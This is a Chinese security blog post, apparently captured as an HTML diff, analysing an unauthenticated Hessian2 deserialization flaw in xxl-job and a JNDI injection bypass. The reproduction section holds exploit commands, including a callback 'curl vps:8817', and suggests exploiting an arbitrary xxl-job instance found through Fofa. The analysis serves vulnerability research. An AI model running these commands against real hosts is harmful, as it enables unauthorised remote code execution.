@@ -1,0 +1,347 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="xxl-job api未授权Hessian2反序列化前言​    xxl-job由于RESTful api未授权相互信任问题，可以直接对关联服务攻击，有师傅已经给出POC,配置执行器,新建任务对关联服务器执行shell命令，但是比较蛋疼的是可能关联服务在内网，无法直接从公网攻击. ​    链接：https:&#x2F;&#x2F;github.com&#x2F;jas502n&#x2F;xxl-job 在较低版本存在Hessian2反">
+<meta property="og:type" content="article">
+<meta property="og:title" content="xxl-job api未授权Hessian2反序列化">
+<meta property="og:url" content="http://zhzhdoai.github.io/2020/10/29/xxl-job-api%E6%9C%AA%E6%8E%88%E6%9D%83Hessian2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/index.html">
+<meta property="og:site_name" content="osword&#39;s blog">
+<meta property="og:description" content="xxl-job api未授权Hessian2反序列化前言​    xxl-job由于RESTful api未授权相互信任问题，可以直接对关联服务攻击，有师傅已经给出POC,配置执行器,新建任务对关联服务器执行shell命令，但是比较蛋疼的是可能关联服务在内网，无法直接从公网攻击. ​    链接：https:&#x2F;&#x2F;github.com&#x2F;jas502n&#x2F;xxl-job 在较低版本存在Hessian2反">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://zhzhdoai.github.io/2020/10/29/xxl-job-api%E6%9C%AA%E6%8E%88%E6%9D%83Hessian2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20201029015127024.png">
+<meta property="og:image" content="http://zhzhdoai.github.io/2020/10/29/xxl-job-api%E6%9C%AA%E6%8E%88%E6%9D%83Hessian2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20201029015441262.png">
+<meta property="og:image" content="http://zhzhdoai.github.io/2020/10/29/xxl-job-api%E6%9C%AA%E6%8E%88%E6%9D%83Hessian2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20201029015544000.png">
+<meta property="og:image" content="http://zhzhdoai.github.io/2020/10/29/xxl-job-api%E6%9C%AA%E6%8E%88%E6%9D%83Hessian2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20201029023740084.png">
+<meta property="og:image" content="http://zhzhdoai.github.io/2020/10/29/xxl-job-api%E6%9C%AA%E6%8E%88%E6%9D%83Hessian2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20201029024407568.png">
+<meta property="og:image" content="http://zhzhdoai.github.io/2020/10/29/xxl-job-api%E6%9C%AA%E6%8E%88%E6%9D%83Hessian2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20201029024318182.png">
+<meta property="article:published_time" content="2020-10-29T10:41:51.000Z">
+<meta property="article:modified_time" content="2020-10-30T10:43:46.284Z">
+<meta property="article:author" content="osword">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://zhzhdoai.github.io/2020/10/29/xxl-job-api%E6%9C%AA%E6%8E%88%E6%9D%83Hessian2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20201029015127024.png">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>xxl-job api未授权Hessian2反序列化</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+      
+<link rel="stylesheet" href="/css/rtl.css">
+
+    
+    <!-- rss -->
+    
+    
+      <link rel="alternate" href="/true" title="osword&#39;s blog" type="application/atom+xml" />
+    
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/projects_url">项目</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" href="/2020/10/16/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98-Apache-Solr-%E6%9C%80%E6%96%B0%E7%89%88SSRF%E6%BC%8F%E6%B4%9E/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://zhzhdoai.github.io/2020/10/29/xxl-job-api%E6%9C%AA%E6%8E%88%E6%9D%83Hessian2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" target="_blank" rel="noopener"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://zhzhdoai.github.io/2020/10/29/xxl-job-api%E6%9C%AA%E6%8E%88%E6%9D%83Hessian2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&text=xxl-job api未授权Hessian2反序列化" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://zhzhdoai.github.io/2020/10/29/xxl-job-api%E6%9C%AA%E6%8E%88%E6%9D%83Hessian2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=xxl-job api未授权Hessian2反序列化" target="_blank" rel="noopener"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://zhzhdoai.github.io/2020/10/29/xxl-job-api%E6%9C%AA%E6%8E%88%E6%9D%83Hessian2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&is_video=false&description=xxl-job api未授权Hessian2反序列化" target="_blank" rel="noopener"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=xxl-job api未授权Hessian2反序列化&body=Check out this article: http://zhzhdoai.github.io/2020/10/29/xxl-job-api%E6%9C%AA%E6%8E%88%E6%9D%83Hessian2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://zhzhdoai.github.io/2020/10/29/xxl-job-api%E6%9C%AA%E6%8E%88%E6%9D%83Hessian2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=xxl-job api未授权Hessian2反序列化" target="_blank" rel="noopener"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://zhzhdoai.github.io/2020/10/29/xxl-job-api%E6%9C%AA%E6%8E%88%E6%9D%83Hessian2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=xxl-job api未授权Hessian2反序列化" target="_blank" rel="noopener"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://zhzhdoai.github.io/2020/10/29/xxl-job-api%E6%9C%AA%E6%8E%88%E6%9D%83Hessian2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=xxl-job api未授权Hessian2反序列化" target="_blank" rel="noopener"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://zhzhdoai.github.io/2020/10/29/xxl-job-api%E6%9C%AA%E6%8E%88%E6%9D%83Hessian2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=xxl-job api未授权Hessian2反序列化" target="_blank" rel="noopener"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://zhzhdoai.github.io/2020/10/29/xxl-job-api%E6%9C%AA%E6%8E%88%E6%9D%83Hessian2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&name=xxl-job api未授权Hessian2反序列化&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=http://zhzhdoai.github.io/2020/10/29/xxl-job-api%E6%9C%AA%E6%8E%88%E6%9D%83Hessian2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&t=xxl-job api未授权Hessian2反序列化" target="_blank" rel="noopener"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#xxl-job-api未授权Hessian2反序列化"><span class="toc-number">1.</span> <span class="toc-text">xxl-job api未授权Hessian2反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-number">1.1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#测试环境"><span class="toc-number">1.2.</span> <span class="toc-text">测试环境</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#JobApiController-api"><span class="toc-number">1.3.</span> <span class="toc-text">JobApiController#api</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#JNDI-Bypass"><span class="toc-number">2.</span> <span class="toc-text">JNDI Bypass</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#复现"><span class="toc-number">3.</span> <span class="toc-text">复现</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#参考链接"><span class="toc-number">4.</span> <span class="toc-text">参考链接</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        xxl-job api未授权Hessian2反序列化
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">osword's blog</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2020-10-29T10:41:51.000Z" itemprop="datePublished">2020-10-29</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+      <span id="/2020/10/29/xxl-job-api%E6%9C%AA%E6%8E%88%E6%9D%83Hessian2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="leancloud_visitors" data-flag-title="xxl-job api未授权Hessian2反序列化">
+    <em class="post-meta-item-text">阅读量 </em>
+    <i class="leancloud-visitors-count" data-index="/2020/10/29/xxl-job-api%E6%9C%AA%E6%8E%88%E6%9D%83Hessian2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"></span>
+    </div>
+
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h1 id="xxl-job-api未授权Hessian2反序列化"><a href="#xxl-job-api未授权Hessian2反序列化" class="headerlink" title="xxl-job api未授权Hessian2反序列化"></a>xxl-job api未授权Hessian2反序列化</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>​    xxl-job由于RESTful api未授权相互信任问题，可以直接对关联服务攻击，有师傅已经给出POC,配置执行器,新建任务对关联服务器执行<code>shell</code>命令，但是比较蛋疼的是可能关联服务在内网，无法直接从公网攻击.</p>
+<p>​    链接：<a href="https://github.com/jas502n/xxl-job" target="_blank" rel="noopener">https://github.com/jas502n/xxl-job</a></p>
+<p>在较低版本存在Hessian2反序列化，可以直接攻击xxl-job所在主机.</p>
+<h2 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h2><p>xxl-job 2.0.2</p>
+<p>Jdk: 8u191</p>
+<p>Linux</p>
+<h2 id="JobApiController-api"><a href="#JobApiController-api" class="headerlink" title="JobApiController#api"></a>JobApiController#api</h2><p>在version&lt;2.0.2版本中,<code>JobApiController#api</code>中调用<code>invokeAdminService</code>处理请求数据. 且设置了造成<code>@PermessionLimit(limit=false)</code>访问该接口不需要鉴权</p>
+<p><img src="./image-20201029015127024.png" alt="image-20201029015127024"></p>
+<p>直接单步跟进<code>com.xxl.job.admin.core.schedule.XxlJobDynamicScheduler.invokeAdminService</code>=&gt;<code>com.xxl.rpc.remoting.net.impl.servlet.server.ServletServerHandler.handle</code>方法中,调用<code>parseRequest</code>处理<code>request</code>对象</p>
+<p><img src="./image-20201029015441262.png" alt="image-20201029015441262"></p>
+<p>继续跟进，调用<code>readBytes</code>读取请求中的数据,最终是调用<code>Hessian2</code>反序列化<code>requestBytes</code>.</p>
+<p><img src="./image-20201029015544000.png" alt="image-20201029015544000"></p>
+<h1 id="JNDI-Bypass"><a href="#JNDI-Bypass" class="headerlink" title="JNDI Bypass"></a>JNDI Bypass</h1><p>参考：<a href="https://www.veracode.com/blog/research/exploiting-jndi-injections-java" target="_blank" rel="noopener">https://www.veracode.com/blog/research/exploiting-jndi-injections-java</a></p>
+<p>在测试时候总需要找一个稳定的POC，高版本JDK对JNDI注入进行限制即限制远程类加载，表现在如RMI/LDAP服务收到请求，HTTP服务无响应.</p>
+<p>绕过的思路是：在CLASSPATH中找到工厂类，对引用的Reference属性添加危险方法或属性，该危险方法也需要在CLASSPATH中存在.</p>
+<p>原文作者利用Apache Tomcat中的<code>org.apache.naming.factory.BeanFactory</code>类,结合<code>javax.el.ELProcessor</code>执行任意代码.赶巧的是<code>xxl-job</code>基于<code>Spring</code>框架，底层是利用<code>tomcat</code>服务器.</p>
+<p><img src="./image-20201029023740084.png" alt="image-20201029023740084"></p>
+<h1 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h1><p>现成的JNDI Bypass利用工具已经有师傅写好，可以直接拿来用</p>
+<p><a href="https://github.com/welk1n/JNDI-Injection-Exploit" target="_blank" rel="noopener">https://github.com/welk1n/JNDI-Injection-Exploit</a></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># 启动服务</span></span><br><span class="line">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -A 0.0.0.0 -C <span class="string">"curl vps:8817"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成payload</span></span><br><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.Hessian2 SpringAbstractBeanFactoryPointcutAdvisor [rmi服务] &gt; ~/Desktop/test13.ser</span><br></pre></td></tr></table></figure>
+
+<p>Fofa 上随便找个xxl-job,具体指纹访问api会有如下报错.</p>
+<p><img src="./image-20201029024407568.png" alt="image-20201029024407568"></p>
+<p>利用如下</p>
+<p><img src="./image-20201029024318182.png" alt="image-20201029024318182"></p>
+<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://www.xuxueli.com/xxl-job/" target="_blank" rel="noopener">https://www.xuxueli.com/xxl-job/</a></p>
+<p><a href="https://github.com/welk1n/JNDI-Injection-Exploit" target="_blank" rel="noopener">https://github.com/welk1n/JNDI-Injection-Exploit</a></p>
+<p><a href="https://www.veracode.com/blog/research/exploiting-jndi-injections-java" target="_blank" rel="noopener">https://www.veracode.com/blog/research/exploiting-jndi-injections-java</a></p>
+
+  </div>
+</article>
+
+    <section id="comments" class="comments">
+      <style>
+        .comments{margin:30px;padding:10px;background:#fff}
+        @media screen and (max-width:800px){.comments{margin:auto;padding:10px;background:#fff}}
+      </style>
+      <div class="valine_comment"></div>
+<!--载入js，在</body>之前插入即可-->
+<!--Leancloud 操作库:-->
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<!--Valine 的核心代码库-->
+<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+<script>
+  new Valine({
+      el: '.valine_comment',
+      app_id: 'iQQPWYCs248kHd506mp50DKg-gzGzoHsz',
+      app_key: 'oUxg0tEGmlJSq2r3FuvEXgr4',
+      placeholder: '这里留言。。',
+      notify: 'true',
+      verify: 'true',
+      visitor: true
+    });
+</script>
+
+    </section>
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/projects_url">项目</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#xxl-job-api未授权Hessian2反序列化"><span class="toc-number">1.</span> <span class="toc-text">xxl-job api未授权Hessian2反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-number">1.1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#测试环境"><span class="toc-number">1.2.</span> <span class="toc-text">测试环境</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#JobApiController-api"><span class="toc-number">1.3.</span> <span class="toc-text">JobApiController#api</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#JNDI-Bypass"><span class="toc-number">2.</span> <span class="toc-text">JNDI Bypass</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#复现"><span class="toc-number">3.</span> <span class="toc-text">复现</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#参考链接"><span class="toc-number">4.</span> <span class="toc-text">参考链接</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://zhzhdoai.github.io/2020/10/29/xxl-job-api%E6%9C%AA%E6%8E%88%E6%9D%83Hessian2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" target="_blank" rel="noopener"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://zhzhdoai.github.io/2020/10/29/xxl-job-api%E6%9C%AA%E6%8E%88%E6%9D%83Hessian2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&text=xxl-job api未授权Hessian2反序列化" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://zhzhdoai.github.io/2020/10/29/xxl-job-api%E6%9C%AA%E6%8E%88%E6%9D%83Hessian2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=xxl-job api未授权Hessian2反序列化" target="_blank" rel="noopener"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://zhzhdoai.github.io/2020/10/29/xxl-job-api%E6%9C%AA%E6%8E%88%E6%9D%83Hessian2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&is_video=false&description=xxl-job api未授权Hessian2反序列化" target="_blank" rel="noopener"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=xxl-job api未授权Hessian2反序列化&body=Check out this article: http://zhzhdoai.github.io/2020/10/29/xxl-job-api%E6%9C%AA%E6%8E%88%E6%9D%83Hessian2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://zhzhdoai.github.io/2020/10/29/xxl-job-api%E6%9C%AA%E6%8E%88%E6%9D%83Hessian2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=xxl-job api未授权Hessian2反序列化" target="_blank" rel="noopener"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://zhzhdoai.github.io/2020/10/29/xxl-job-api%E6%9C%AA%E6%8E%88%E6%9D%83Hessian2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=xxl-job api未授权Hessian2反序列化" target="_blank" rel="noopener"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://zhzhdoai.github.io/2020/10/29/xxl-job-api%E6%9C%AA%E6%8E%88%E6%9D%83Hessian2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=xxl-job api未授权Hessian2反序列化" target="_blank" rel="noopener"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://zhzhdoai.github.io/2020/10/29/xxl-job-api%E6%9C%AA%E6%8E%88%E6%9D%83Hessian2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=xxl-job api未授权Hessian2反序列化" target="_blank" rel="noopener"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://zhzhdoai.github.io/2020/10/29/xxl-job-api%E6%9C%AA%E6%8E%88%E6%9D%83Hessian2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&name=xxl-job api未授权Hessian2反序列化&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=http://zhzhdoai.github.io/2020/10/29/xxl-job-api%E6%9C%AA%E6%8E%88%E6%9D%83Hessian2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&t=xxl-job api未授权Hessian2反序列化" target="_blank" rel="noopener"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2020
+    osword
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/projects_url">项目</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+
+    <!-- jquery -->
+
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+
+<!-- clipboard -->
+
+  
+<script src="/lib/clipboard/clipboard.min.js"></script>
+
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
